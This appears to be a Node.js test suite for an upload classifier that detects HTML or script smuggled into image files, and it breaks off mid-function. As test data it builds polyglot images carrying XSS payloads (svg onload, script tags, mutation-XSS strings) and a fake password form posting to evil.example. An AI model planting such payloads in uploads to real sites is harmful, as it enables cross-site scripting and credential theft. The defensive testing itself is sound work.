// S-uploads2a (2026-09-26): lib/uploadSecurity.ts's byte classifier, second
// line of defence behind the typed, allowlisted serving in lib/r2.ts.
//
//   1. Refuter bypasses that passed as image/jpeg before: a tag name ended
//      by a form feed or NUL, UTF-16 markup, <style>, <form>.
//   2. ISO brands: an explicit video allowlist (M4A/M4B audio and Canon CR3
//      raw were stored as video/mp4); AVIF whose major brand is mif1/msf1;
//      HEIC stays refused. Classic QuickTime movies without an ftyp box.
//   3. No false positives on real photos: every image in the repo, seeded
//      synthetic JPEG/PNG/GIF/WebP/AVIF/motion-photo/MPF files, and (when
//      sharp is installed) real encoder output. Four-letter tokens planted
//      in COMPRESSED data are noise, not markup (a whole-file scan flags
//      about 1 real 12 MB photo in 600); a '<script' there is still found.
//
// Every failure is listed before the exit code is set, so running this
// against an older uploadSecurity.ts shows each gap:
//   UPLOAD_SECURITY_TS=/tmp/old-uploadSecurity.ts node test-upload-markup-scan-pure.cjs
const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')
const { execFileSync } = require('node:child_process')
const ts = require('typescript')

const SOURCE = process.env.UPLOAD_SECURITY_TS || path.join(__dirname, '..', 'src', 'lib', 'uploadSecurity.ts')
function loadTs(filePath) {
  const outputText = ts.transpileModule(fs.readFileSync(filePath, 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 },
    fileName: filePath,
  }).outputText
  const loaded = { exports: {} }
  new Function('exports', 'require', 'module', '__filename', '__dirname', outputText)(loaded.exports, require, loaded, filePath, path.dirname(filePath))
  return loaded.exports
}
const security = loadTs(SOURCE)

const failures = []
let checks = 0
function check(label, fn) {
  checks += 1
  try { fn() } catch (error) { failures.push(`${label}: ${error.message.split('\n')[0]}`) }
}

// ------------------------------------------------------------ builders
const enc = (text) => new TextEncoder().encode(text)
const bytes = (...parts) => {
  const arrays = parts.map((part) => (typeof part === 'string' ? enc(part) : part instanceof Uint8Array ? part : Uint8Array.from(part)))
  const out = new Uint8Array(arrays.reduce((sum, a) => sum + a.length, 0))
  let offset = 0
  for (const a of arrays) { out.set(a, offset); offset += a.length }
  return out
}
const utf16le = (text) => new Uint8Array(Buffer.from(text, 'utf16le'))
const utf16be = (text) => { const le = utf16le(text); const be = new Uint8Array(le.length); for (let i = 0; i < le.length; i += 2) { be[i] = le[i + 1]; be[i + 1] = le[i] } return be }
const u16be = (n) => [(n >> 8) & 0xff, n & 0xff]
const u32be = (n) => [(n >>> 24) & 0xff, (n >>> 16) & 0xff, (n >>> 8) & 0xff, n & 0xff]
const u32le = (n) => [n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff]

function mulberry32(seed) {
  return function next() {
    seed = (seed + 0x6d2b79f5) | 0
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
function randomBytes(rng, length) {
  const out = new Uint8Array(length)
  for (let index = 0; index < length; index += 1) out[index] = (rng() * 256) | 0
  return out
}
// Random data with `plants` written in at fixed offsets.
function planted(rng, length, plants = []) {
  const out = randomBytes(rng, length)
  for (const { at, data } of plants) out.set(data, at)
  return out
}

const jpegSegment = (marker, payload) => bytes([0xff, marker, ...u16be(payload.length + 2)], payload)
// JPEG entropy-coded data: every 0xFF stuffed with 0x00, a restart marker
// every 4 KB, as an encoder writes it.
function entropyCoded(raw) {
  const out = new Uint8Array(raw.length * 2 + 16)
  let length = 0
  for (let index = 0; index < raw.length; index += 1) {
    out[length++] = raw[index]
    if (raw[index] === 0xff) out[length++] = 0x00
    if (index % 4096 === 4095) { out[length++] = 0xff; out[length++] = 0xd0 + ((index >> 12) % 8) }
  }
  return out.subarray(0, length)
}
const JFIF_APP0 = jpegSegment(0xe0, bytes('JFIF\0', [1, 1, 0, 0, 72, 0, 72, 0, 0]))
function jpeg({ segments = [], scan, trailer = new Uint8Array(0), rng = mulberry32(1) } = {}) {
  return bytes(
    [0xff, 0xd8], JFIF_APP0, ...segments,
    jpegSegment(0xdb, bytes([0], randomBytes(rng, 64))),
    jpegSegment(0xc0, bytes([8, 0, 16, 0, 16, 3, 1, 0x22, 0, 2, 0x11, 1, 3, 0x11, 1])),
    jpegSegment(0xc4, bytes([0], randomBytes(rng, 28))),
    jpegSegment(0xda, bytes([3, 1, 0, 2, 0x11, 3, 0x11, 0, 0x3f, 0])),
    entropyCoded(scan || randomBytes(rng, 2048)),
    [0xff, 0xd9], trailer,
  )
}
const comSegment = (text) => jpegSegment(0xfe, typeof text === 'string' ? enc(text) : text)
// 2 KB of neutral APP2 data so a segment after it lies beyond the
// 1445-byte sniffing window.
const APP_PADDING = jpegSegment(0xe2, bytes('ICC_PROFILE\0', [1, 1], new Uint8Array(2048).fill(0x11)))

const pngChunk = (type, data) => bytes(u32be(data.length), type, data, [0, 0, 0, 0])
const PNG_SIG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]
const png = (...chunks) => bytes(PNG_SIG, pngChunk('IHDR', bytes(u32be(16), u32be(16), [8, 2, 0, 0, 0])), ...chunks, pngChunk('IEND', new Uint8Array(0)))

function gifSubBlocks(data) {
  const parts = []
  for (let index = 0; index < data.length; index += 255) {
    const block = data.subarray(index, index + 255)
    parts.push(bytes([block.length], block))
  }
  return bytes(...parts, [0])
}
const gifComment = (text) => bytes([0x21, 0xfe], gifSubBlocks(enc(text)))
function gif({ lzw, extensions = [], rng = mulberry32(2) } = {}) {
  return bytes('GIF89a', [16, 0, 16, 0, 0xf7, 0, 0], randomBytes(rng, 768), ...extensions,
    [0x21, 0xf9, 4, 0, 0, 0, 0, 0],
    [0x2c, 0, 0, 0, 0, 16, 0, 16, 0, 0], [8], gifSubBlocks(lzw || randomBytes(rng, 4096)), [0x3b])
}

const webpChunk = (fourcc, data) => bytes(fourcc, u32le(data.length), data, data.length % 2 ? [0] : [])
function webp(...chunks) {
  const body = bytes('WEBP', ...chunks)
  return bytes('RIFF', u32le(body.length), body)
}

const isoBox = (type, data) => bytes(u32be(data.length + 8), type, data)
const ftyp = (major, ...compatible) => isoBox('ftyp', bytes(major, [0, 0, 0, 0], ...compatible))
const avif = (meta, mdat) => bytes(ftyp('avif', 'mif1', 'miaf'), isoBox('meta', meta), isoBox('mdat', mdat))

const EMBEDDED = /embedded web page or script/

// ------------------------------------------------ 1. refuter bypasses
const BYPASSES = [
  ['<script + form feed', enc('<script\f>alert(document.domain)</script>')],
  ['<svg + NUL', enc('<svg\0onload=alert(1)>')],
  ['UTF-16LE <script>', utf16le('<script>alert(1)</script>')],
  ['UTF-16BE <script>', utf16be('<script>alert(1)</script>')],
  ['<style>', enc('<style>@import url(https://evil.example/x.css)</style>')],
  ['<form>', enc('<form action=https://evil.example/steal method=post><input name=password></form>')],
  // The rest of the token list, and forms the old terminator rule missed.
  ['<a href=', enc('<a href=//evil.example>continue</a>')],
  ['<a/href', enc('<a/href="//evil.example">x</a>')],
  ['<link rel=stylesheet', enc('<link rel=stylesheet href=//evil.example/x.css>')],
  ['<base href', enc('<base href=//evil.example/>')],
  ['<frameset>', enc('<frameset><frame src=//evil.example></frameset>')],
  ['<applet', enc('<applet code=x.class>')],
  ['<math>', enc('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>')],
  ['<!DOCTYPE\\nhtml', enc('<!DOCTYPE\nhtml><p>x')],
  ['UTF-16LE <svg/onload>', utf16le('<svg/onload=alert(1)>')],
]
for (const [label, payload] of BYPASSES) {
  const carriers = [
    ['JPEG COM segment beyond the sniffing window', jpeg({ segments: [APP_PADDING, comSegment(payload)] })],
    ['JPEG EXIF segment', jpeg({ segments: [jpegSegment(0xe1, bytes('Exif\0\0MM\0*', [0, 0, 0, 8], payload))] })],
    ['JPEG head', jpeg({ segments: [comSegment(payload)] })],
    ['after the JPEG end marker', jpeg({ segments: [APP_PADDING], trailer: payload })],
    ['PNG tEXt chunk', png(pngChunk('tEXt', bytes('Comment\0', payload)), pngChunk('IDAT', randomBytes(mulberry32(3), 3000)))],
    ['GIF comment extension', gif({ extensions: [bytes([0x21, 0xfe], gifSubBlocks(payload))] })],
    ['WebP XMP chunk', webp(webpChunk('VP8 ', randomBytes(mulberry32(4), 3000)), webpChunk('XMP ', payload))],
    ['AVIF meta box', avif(bytes(new Uint8Array(1600), payload), randomBytes(mulberry32(5), 3000))],
  ]
  for (const [where, file] of carriers) {
    check(`bypass ${label} in ${where}`, () => {
      assert.ok(security.detectUploadFormat(file), 'the signature is an allowlisted image')
      assert.equal(security.containsEmbeddedMarkup(file), true, 'markup must be found')
      assert.throws(() => security.classifyUploadedBuffer(file), EMBEDDED)
      assert.throws(() => security.validateUploadedBuffer(file, 'image/jpeg', 'photo.jpg'), EMBEDDED)
    })
  }
}

// Text a photo legitimately carries: never a token.
const XMP_PACKET = '<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 9.1">'
  + '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/"'
  + ' xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stEvt="http://ns.adobe.com/xap/1.0/sType/ResourceEvent#" xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/"'
  + ' xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:crs="http://ns.adobe.com/camera-raw-settings/1.0/" xmlns:GCamera="http://ns.google.com/photos/1.0/camera/"'
  + ' xmlns:Container="http://ns.google.com/photos/1.0/container/" xmlns:Item="http://ns.google.com/photos/1.0/container/item/" xmlns:hdrgm="http://ns.adobe.com/hdr-gain-map/1.0/"'
  + ' xmp:CreatorTool="Adobe Photoshop 25.0 (Windows)" xmp:MetadataDate="2026-09-26T10:00:00+07:00" photoshop:ColorMode="3" GCamera:MotionPhoto="1" hdrgm:Version="1.0">'
  + '<xmpMM:History><rdf:Seq><rdf:li stEvt:action="saved" stEvt:softwareAgent="Adobe Photoshop"/></rdf:Seq></xmpMM:History>'
  + '<dc:description><rdf:Alt><rdf:li xml:lang="x-default">Serum 30ml &lt;new&gt; a < b, <b>bold</b>, <3, <svgx, <imgs, <scripts, <styles, <forms, <meta:x, <svg:svg, <linked, <baseline, <mathematics, <framed, <body-lotion, <html5</rdf:li></rdf:Alt></dc:description>'
  + '<Container:Directory><rdf:Seq><rdf:li rdf:parseType="Resource"><Container:Item Item:Mime="image/jpeg" Item:Semantic="Primary"/></rdf:li></rdf:Seq></Container:Directory>'
  + '<crs:ToneCurvePV2012><rdf:Seq><rdf:li>0, 0</rdf:li></rdf:Seq></crs:ToneCurvePV2012></rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>'
check('real-world XMP/EXIF text is not markup', () => {
  const xmpJpeg = jpeg({ segments: [jpegSegment(0xe1, bytes('http://ns.adobe.com/xap/1.0/\0', XMP_PACKET)), jpegSegment(0xe1, bytes('Exif\0\0II*\0', [8, 0, 0, 0], 'Serum <new> a<b'))] })
  assert.equal(security.containsEmbeddedMarkup(xmpJpeg), false)
  assert.equal(security.classifyUploadedBuffer(xmpJpeg).mime, 'image/jpeg')
  assert.equal(security.containsEmbeddedMarkup(png(pngChunk('iTXt', bytes('XML:com.adobe.xmp\0\0\0\0\0', XMP_PACKET)))), false)
  assert.equal(security.containsEmbeddedMarkup(webp(webpChunk('VP8 ', randomBytes(mulberry32(6), 2000)), webpChunk('XMP ', enc(XMP_PACKET)))), false)
})

// ---------------------------------------------------- 2. ISO brands
const MOOV = isoBox('moov', isoBox('mvhd', new Uint8Array(100)))
const MDAT = isoBox('mdat', randomBytes(mulberry32(8), 600))
const brandCases = [
  ['M4A audio', bytes(ftyp('M4A ', 'M4A ', 'mp42', 'isom'), MOOV, MDAT), null],
  ['M4B audiobook', bytes(ftyp('M4B ', 'M4B ', 'mp42', 'isom'), MOOV, MDAT), null],
  ['M4P protected audio', bytes(ftyp('M4P ', 'M4P ', 'mp42'), MOOV, MDAT), null],
  ['Canon CR3 raw photo', bytes(ftyp('crx ', 'crx ', 'isom'), MOOV, MDAT), null],
  ['unknown brand', bytes(ftyp('abcd', 'abcd'), MOOV, MDAT), null],
  ['HEIC', bytes(ftyp('heic', 'mif1', 'heic'), isoBox('meta', new Uint8Array(40)), MDAT), null],
  ['HEIF mif1 + heic', bytes(ftyp('mif1', 'mif1', 'heic'), isoBox('meta', new Uint8Array(40)), MDAT), null],
  ['HEIF mif1 + avif + heic (HEIC stays refused)', bytes(ftyp('mif1', 'mif1', 'avif', 'heic'), isoBox('meta', new Uint8Array(40)), MDAT), null],
  ['HEIF msf1 sequence + hevc', bytes(ftyp('msf1', 'msf1', 'hevc'), MOOV, MDAT), null],
  ['mif1-major AVIF', bytes(ftyp('mif1', 'mif1', 'avif', 'miaf'), isoBox('meta', new Uint8Array(40)), MDAT), 'image/avif'],
  ['msf1-major AVIF sequence', bytes(ftyp('msf1', 'msf1', 'avis', 'iso8'), MOOV, MDAT), 'image/avif'],
  ['avif major', bytes(ftyp('avif', 'mif1', 'miaf'), isoBox('meta', new Uint8Array(40)), MDAT), 'image/avif'],
  ['avis major', bytes(ftyp('avis', 'avis', 'msf1'), MOOV, MDAT), 'image/avif'],
  ['isom', bytes(ftyp('isom', 'isom', 'iso2', 'avc1', 'mp41'), MOOV, MDAT), 'video/mp4'],
  ['mp42 (phones)', bytes(ftyp('mp42', 'mp42', 'isom'), MOOV, MDAT), 'video/mp4'],
  ['M4V (Apple)', bytes(ftyp('M4V ', 'M4V ', 'M4A ', 'mp42', 'isom'), MOOV, MDAT), 'video/mp4'],
  ['3gp4', bytes(ftyp('3gp4', '3gp4', 'isom'), MOOV, MDAT), 'video/mp4'],
  ['XAVC (Sony)', bytes(ftyp('XAVC', 'XAVC', 'mp42', 'iso2'), MOOV, MDAT), 'video/mp4'],
  ['qt (iPhone)', bytes(ftyp('qt  ', 'qt  '), isoBox('wide', new Uint8Array(0)), MDAT, MOOV), 'video/quicktime'],
  // Classic QuickTime: no ftyp, starts with an atom.
  ['QuickTime wide + mdat', bytes(isoBox('wide', new Uint8Array(0)), MDAT, MOOV), 'video/quicktime'],
  ['QuickTime moov first', bytes(MOOV, MDAT), 'video/quicktime'],
  ['QuickTime mdat first', bytes(MDAT, MOOV), 'video/quicktime'],
  ['QuickTime free + moov', bytes(isoBox('free', new Uint8Array(24)), MOOV, MDAT), 'video/quicktime'],
  ['QuickTime skip + mdat (64-bit size)', bytes(isoBox('skip', new Uint8Array(8)), [0, 0, 0, 1], 'mdat', u32be(0), u32be(16 + 600), randomBytes(mulberry32(9), 600)), 'video/quicktime'],
  ['QuickTime pnot + PICT + moov', bytes(isoBox('pnot', new Uint8Array(12)), isoBox('PICT', new Uint8Array(64)), MOOV, MDAT), 'video/quicktime'],
  ['QuickTime head of a large file (mdat runs past the read)', bytes(isoBox('wide', new Uint8Array(0)), u32be(50 * 1024 * 1024), 'mdat', randomBytes(mulberry32(10), 4000)), 'video/quicktime'],
  ['free atom alone (no movie atom)', isoBox('free', new Uint8Array(40)), null],
  ['text whose bytes 4-8 spell mdat', enc('Somemdat, a note about the shop, not a movie\n'), null],
  ['text "The free..."', enc('The free sample goes with every order\n'), null],
  ['broken atom chain (size 3)', bytes(isoBox('wide', new Uint8Array(0)), [0, 0, 0, 3], 'mdat', new Uint8Array(20)), null],
]
for (const [label, file, mime] of brandCases) {
  check(`brand ${label}`, () => {
    const detected = security.detectUploadFormat(file)
    assert.equal(detected ? detected.mime : null, mime)
    if (mime) assert.equal(security.classifyUploadedBuffer(file).mime, mime)
    else assert.throws(() => security.classifyUploadedBuffer(file), /not supported/)
  })
}

// ----------------------------------------- 3a. every image in the repo
const repoRoot = path.resolve(__dirname, '..', '..')
const IMAGE_FILE = /\.(png|jpe?g|gif|webp|avif|ico|bmp|tiff?|heic|heif)$/i
const repoImages = execFileSync('git', ['ls-files', '-z'], { cwd: repoRoot, encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 })
  .split('\0').filter((file) => IMAGE_FILE.test(file))
const repoFormats = {}
for (const file of repoImages) {
  const data = new Uint8Array(fs.readFileSync(path.join(repoRoot, file)))
  const detected = security.detectUploadFormat(data)
  const label = detected ? detected.mime : 'not on the upload list'
  repoFormats[label] = (repoFormats[label] || 0) + 1
  check(`repo image ${file}`, () => {
    assert.equal(security.containsEmbeddedMarkup(data), false, 'a real image must not be flagged')
    if (detected && detected.kind === 'image') assert.equal(security.classifyUploadedBuffer(data).mime, detected.mime)
  })
}
check('the repo sweep saw real images', () => assert.ok(repoImages.length >= 10, `only ${repoImages.length} images found`))
// The e2e suite uploads and shows the images in frontend/e2e/fixtures; each
// must be tracked so the sweep above scans it.
check('every frontend/e2e/fixtures image is in the repo sweep', () => {
  const fixtures = fs.readdirSync(path.join(repoRoot, 'frontend', 'e2e', 'fixtures')).filter((file) => IMAGE_FILE.test(file))
  assert.ok(fixtures.length >= 1, 'no image found in frontend/e2e/fixtures')
  for (const file of fixtures) assert.ok(repoImages.includes(`frontend/e2e/fixtures/${file}`), `${file} is not tracked, so it is not scanned`)
})

// Positive/negative controls on real PNGs: a 4-letter token inside the
// compressed IDAT data past the sniffing window is noise; '<script' there,
// or '<svg' in a text chunk, is markup. The first 1445 bytes (the WHATWG
// MIME-sniffing window) get every token whatever the part, so a PNG whose
// IDAT lies inside the window (the 1,050-byte e2e about-poster.png) gets the
// opposite control: '<svg ' planted there is markup.
const PAST_WINDOW = 1445 + 64
function pngChunks(data) {
  const chunks = []
  for (let offset = 8; offset + 12 <= data.length;) {
    const length = ((data[offset] << 24) >>> 0) + (data[offset + 1] << 16) + (data[offset + 2] << 8) + data[offset + 3]
    chunks.push({ offset, type: String.fromCharCode(...data.subarray(offset + 4, offset + 8)), dataStart: offset + 8, length })
    offset += 12 + length
  }
  return chunks
}
const realPngs = repoImages.filter((file) => /\.png$/i.test(file)).map((file) => [file, new Uint8Array(fs.readFileSync(path.join(repoRoot, file)))])
for (const [file, data] of realPngs) {
  const idat = pngChunks(data).find((chunk) => chunk.type === 'IDAT' && chunk.length > 64)
  if (!idat) continue
  const middle = idat.dataStart + (idat.length >> 1)
  const pastWindow = Math.max(PAST_WINDOW, middle)
  const at = pastWindow + 8 <= idat.dataStart + idat.length ? pastWindow : middle
  if (at === pastWindow) {
    check(`real PNG ${file}: '<svg ' planted in IDAT is noise`, () => {
      const copy = data.slice()
      copy.set(enc('<svg '), at)
      assert.equal(security.containsEmbeddedMarkup(copy), false)
      copy.set(enc('<IMG\t'), at)
      assert.equal(security.containsEmbeddedMarkup(copy), false)
    })
  } else {
    check(`real PNG ${file}: '<svg ' planted in IDAT inside the sniffing window is found`, () => {
      assert.ok(at + 5 <= 1445, `IDAT middle ${at} is not inside the sniffing window`)
      const copy = data.slice()
      copy.set(enc('<svg '), at)
      assert.equal(security.containsEmbeddedMarkup(copy), true)
      copy.set(enc('<IMG\t'), at)
      assert.equal(security.containsEmbeddedMarkup(copy), true)
    })
  }
  check(`real PNG ${file}: '<script>' planted in IDAT is found`, () => {
    const copy = data.slice()
    copy.set(enc('<script>'), at)
    assert.equal(security.containsEmbeddedMarkup(copy), true)
  })
  check(`real PNG ${file}: '<svg onload' in an added tEXt chunk is found`, () => {
    const withText = bytes(data.subarray(0, idat.offset), pngChunk('tEXt', enc('Comment\0<svg onload=alert(1)>')), data.subarray(idat.offset))
    assert.equal(security.containsEmbeddedMarkup(withText), true)
  })
}

// ------------------------------------ 3a'. C2PA Content Credentials
// Cameras, editors and AI image generators write a C2PA manifest (JUMBF)
// whose tool icon is an SVG document -- the repo logos above carry one.
// Inside a manifest an inert icon is allowed; script and event handlers
// are not. The same icon outside a manifest is still markup.
const C2PA_UUID = [0xd8, 0xfe, 0xc3, 0xd6, 0x1b, 0x0e, 0x48, 0x3c, 0x92, 0x97, 0x58, 0x28, 0x87, 0x7e, 0xc4, 0x81]
const ICON_SVG = '<svg width="716" height="716" viewBox="0 0 716 716" fill="none" xmlns="http://www.w3.org/2000/svg">\n<path d="M508.7 317.4C516.8 287.3 509 253.9 485.4 230.3Z" fill="black"/>\n</svg>'
const ICON_SVG_STYLED = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><style>.cls-1{fill:#e1251b}</style></defs><a href="https://example.com/tool"><path class="cls-1" d="M0 0h24v24H0z"/></a><image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/></svg>'
function jumbf(icon, rng = mulberry32(11)) {
  // jumb superbox: description box + CBOR-ish assertion + icon (bfdb/bidb) + a compressed thumbnail.
  const description = isoBox('jumd', bytes([0x63, 0x32, 0x70, 0x61, 0, 0x11, 0, 0x10, 0x80, 0, 0, 0xaa, 0, 0x38, 0x9b, 0x71], 'c2pa\0'))
  const assertion = isoBox('cbor', bytes([0xa2, 0x66], 'action', [0x6b], 'c2pa.opened', [0x64], 'when', [0x74], '2026-09-26T10:00:00Z'))
  const iconBoxes = bytes(isoBox('bfdb', bytes([0], 'image/svg+xml\0')), isoBox('bidb', typeof icon === 'string' ? enc(icon) : icon))
  const thumbnail = isoBox('bidb', entropyCoded(randomBytes(rng, 30000)))
  return isoBox('jumb', bytes(description, assertion, iconBoxes, thumbnail))
}
const c2paCarriers = [
  ['PNG caBX chunk', (icon) => png(pngChunk('caBX', jumbf(icon)), pngChunk('IDAT', randomBytes(mulberry32(12), 3000)))],
  ['JPEG APP11 JUMBF', (icon) => jpeg({ segments: [jpegSegment(0xeb, bytes('JP', [0, 1, 0, 0, 0, 1], jumbf(icon)))] })],
  ['WebP C2PA chunk', (icon) => webp(webpChunk('VP8X', new Uint8Array(10)), webpChunk('C2PA', jumbf(icon)), webpChunk('VP8 ', randomBytes(mulberry32(13), 3000)))],
  ['AVIF uuid box', (icon) => bytes(ftyp('avif', 'mif1', 'miaf'), isoBox('meta', new Uint8Array(60)), isoBox('uuid', bytes(C2PA_UUID, [0, 0, 0, 0], 'manifest\0', jumbf(icon))), isoBox('mdat', randomBytes(mulberry32(14), 3000)))],
]
for (const [where, build] of c2paCarriers) {
  for (const [label, icon] of [['inert SVG tool icon', ICON_SVG], ['SVG icon with <style>, <a href>, <image>', ICON_SVG_STYLED]]) {
    check(`C2PA ${where}: ${label} is not markup`, () => {
      const file = build(icon)
      assert.equal(security.containsEmbeddedMarkup(file), false)
      assert.ok(security.classifyUploadedBuffer(file))
    })
  }
  for (const [label, icon] of [
    ['<svg onload>', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><path d="M0 0"/></svg>'],
    ['<svg/onload>', '<svg/onload=alert(1)>'],
    ['onerror on an <image>', '<svg><image href="x" onerror = "alert(1)"/></svg>'],
    ['<script> in the icon', '<svg><script>alert(1)</script></svg>'],
    ['<foreignObject> + <iframe>', '<svg><foreignObject><iframe src="//evil.example"></iframe></foreignObject></svg>'],
    ['javascript: link', '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>'],
    ['UTF-16 onload', utf16le('<svg onload=alert(1)>')],
    ['an HTML page', '<!doctype html><html><body>x</body></html>'],
  ]) {
    check(`C2PA ${where}: ${label} is refused`, () => {
      const file = build(icon)
      assert.equal(security.containsEmbeddedMarkup(file), true)
      assert.throws(() => security.classifyUploadedBuffer(file), EMBEDDED)
    })
  }
}
check('the same inert SVG outside a manifest is markup', () => {
  assert.equal(security.containsEmbeddedMarkup(png(pngChunk('tEXt', bytes('Comment\0', ICON_SVG)))), true)
  assert.equal(security.containsEmbeddedMarkup(jpeg({ segments: [APP_PADDING, comSegment(ICON_SVG)] })), true)
  // A caBX chunk only counts in a PNG; APP11 only with the JUMBF 'JP' prefix.
  assert.equal(security.containsEmbeddedMarkup(jpeg({ segments: [APP_PADDING, jpegSegment(0xeb, bytes('XX', [0, 1, 0, 0, 0, 1], ICON_SVG))] })), true)
  assert.equal(security.containsEmbeddedMarkup(avif(new Uint8Array(40), bytes(new Uint8Array(3000), ICON_SVG))), false, 'a 4-letter token in mdat is noise')
  assert.equal(security.containsEmbeddedMarkup(bytes(ftyp('avif', 'mif1'), isoBox('uuid', bytes(new Uint8Array(16), ICON_SVG)), isoBox('mdat', new Uint8Array(100)))), true, 'a uuid box that is not C2PA gets every token')
})

// -------------------------------- 3b. seeded synthetic structured images
const SHORT_TOKENS = [enc('<svg '), enc('<IMG\t'), enc('<svg\0'), enc('<img>'), enc('<Svg/'), enc('<html '), enc('<form>'), enc('<meta\n'), utf16le('<svg ')]
// Beyond the sniffing window, which is searched with every token.
function plantsFor(rng, length, tokens) {
  return tokens.map((data) => ({ at: 2048 + Math.floor(rng() * (length - 4096)), data }))
}
const synthetic = [
  ['JPEG', 'image/jpeg', (plants, rng) => jpeg({ segments: [jpegSegment(0xe1, bytes('Exif\0\0MM\0*', [0, 0, 0, 8], randomBytes(rng, 4000)))], scan: planted(rng, 400000, plants), rng })],
  ['PNG', 'image/png', (plants, rng) => png(pngChunk('IDAT', planted(rng, 400000, plants)))],
  ['GIF', 'image/gif', (plants, rng) => gif({ lzw: planted(rng, 400000, plants), rng })],
  ['WebP', 'image/webp', (plants, rng) => webp(webpChunk('VP8X', new Uint8Array(10)), webpChunk('VP8 ', planted(rng, 400000, plants)), webpChunk('XMP ', enc(XMP_PACKET)))],
  ['AVIF', 'image/avif', (plants, rng) => avif(randomBytes(rng, 300), planted(rng, 400000, plants))],
  ['JPEG motion photo (Samsung label + MP4 + SEF)', 'image/jpeg', (plants, rng) => jpeg({ rng,
    trailer: bytes('MotionPhoto_Data', ftyp('mp42', 'isom', 'mp42'), isoBox('mdat', planted(rng, 400000, plants)), MOOV, 'SEFH', u32le(1), 'MotionPhoto_Data', 'SEFT') })],
  ['JPEG motion photo (Pixel: MP4 right after the image)', 'image/jpeg', (plants, rng) => jpeg({ rng, trailer: bytes(ftyp('isom', 'isom'), isoBox('mdat', planted(rng, 400000, plants)), MOOV) })],
  ['JPEG + MPF secondary image (gain map)', 'image/jpeg', (plants, rng) => jpeg({ rng, trailer: jpeg({ rng, scan: planted(rng, 400000, plants) }) })],
]
for (const [label, mime, build] of synthetic) {
  for (let seed = 1; seed <= 3; seed += 1) {
    check(`synthetic ${label} seed ${seed}: clean`, () => {
      const file = build([], mulberry32(seed * 101))
      assert.equal(security.detectUploadFormat(file).mime, mime)
      assert.equal(security.containsEmbeddedMarkup(file), false)
      assert.equal(security.classifyUploadedBuffer(file).mime, mime)
    })
    check(`synthetic ${label} seed ${seed}: short tokens in compressed data are noise`, () => {
      const rng = mulberry32(seed * 103)
      assert.equal(security.containsEmbeddedMarkup(build(plantsFor(rng, 400000, SHORT_TOKENS), rng)), false)
    })
    check(`synthetic ${label} seed ${seed}: '<script' in compressed data is found`, () => {
      const rng = mulberry32(seed * 107)
      assert.equal(security.containsEmbeddedMarkup(build(plantsFor(rng, 400000, [enc('<script>')]), rng)), true)
      const rng16 = mulberry32(seed * 109)
      assert.equal(security.containsEmbeddedMarkup(build(plantsFor(rng16, 400000, [utf16le('<iframe ')]), rng16)), true)
    })
  }
}

// ------------------------------------- 3c. real encoder output (sharp)
async function sharpSection() {
  let sharp
  try { sharp = require('sharp') } catch { console.log('SKIP real encoder output: sharp is not installed (optional; not a declared dependency)'); return }
  const rng = mulberry32(2026)
  const noise = (width, height) => sharp(Buffer.from(randomBytes(rng, width * height * 3)), { raw: { width, height, channels: 3 } })
  const withMeta = (image) => {
    let out = image.withExif({ IFD0: { ImageDescription: 'Serum 30ml <new> a<b', Software: 'business-os test', Copyright: '(c) shop' } })
    if (typeof out.withXmp === 'function') out = out.withXmp(XMP_PACKET)
    return out.withIccProfile('p3')
  }
  const outputs = [
    ['JPEG baseline + EXIF/XMP/ICC', 'image/jpeg', await withMeta(noise(1200, 900)).jpeg({ quality: 92 }).toBuffer()],
    ['JPEG progressive', 'image/jpeg', await noise(1200, 900).jpeg({ quality: 85, progressive: true }).toBuffer()],
    ['PNG + metadata', 'image/png', await withMeta(noise(800, 600)).png().toBuffer()],
    ['WebP lossy + metadata', 'image/webp', await withMeta(noise(1000, 800)).webp({ quality: 90 }).toBuffer()],
    ['WebP lossless', 'image/webp', await noise(600, 400).webp({ lossless: true }).toBuffer()],
    ['GIF', 'image/gif', await noise(600, 400).gif().toBuffer()],
    ['AVIF', 'image/avif', await noise(384, 256).avif({ quality: 60, effort: 0 }).toBuffer()],
  ]
  const primary = outputs[0][2]
  outputs.push(['JPEG + appended JPEG (MPF-style)', 'image/jpeg', Buffer.concat([primary, outputs[1][2]])])
  outputs.push(['JPEG + motion photo MP4', 'image/jpeg', Buffer.concat([primary, Buffer.from(bytes('MotionPhoto_Data', ftyp('mp42', 'isom'), isoBox('mdat', randomBytes(rng, 200000)), MOOV))])])
  let total = 0
  for (const [label, mime, buffer] of outputs) {
    const data = new Uint8Array(buffer)
    total += data.length
    check(`encoder ${label}: accepted, not flagged`, () => {
      assert.equal(security.detectUploadFormat(data).mime, mime)
      assert.equal(security.containsEmbeddedMarkup(data), false)
      assert.equal(security.classifyUploadedBuffer(data).mime, mime)
    })
    // Plant into the compressed data the walker must recognise.
    const at = compressedOffset(label, data)
    check(`encoder ${label}: found compressed data to plant in`, () => assert.ok(at > 0))
    if (at > 0) {
      check(`encoder ${label}: '<svg ' in compressed data is noise`, () => {
        const copy = data.slice(); copy.set(enc('<svg '), at)
        assert.equal(security.containsEmbeddedMarkup(copy), false)
      })
      check(`encoder ${label}: '<script>' in compressed data is found`, () => {
        const copy = data.slice(); copy.set(enc('<script>'), at)
